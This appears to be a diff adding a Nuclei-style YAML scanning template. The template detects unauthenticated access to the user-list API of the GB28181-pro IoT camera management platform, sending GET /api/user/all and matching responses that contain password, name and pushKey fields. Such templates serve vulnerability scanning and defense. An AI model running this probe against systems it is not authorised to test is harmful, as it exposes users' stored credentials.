@@ -1,0 +1,25 @@
+id: GB28181-unauthorized
+
+info:
+  name: "GB28181-pro开源物联网摄像头管理平台api 接口未授权访问"
+  author: Unknown
+  severity: medium
+  tags: GB28181-pro
+
+http:
+- raw:
+  - |
+    GET /api/user/all HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - '"password":'
+    - '"name":'
+    - '"pushKey":'
+    condition: and
+  - type: status
+    status:
+    - 200
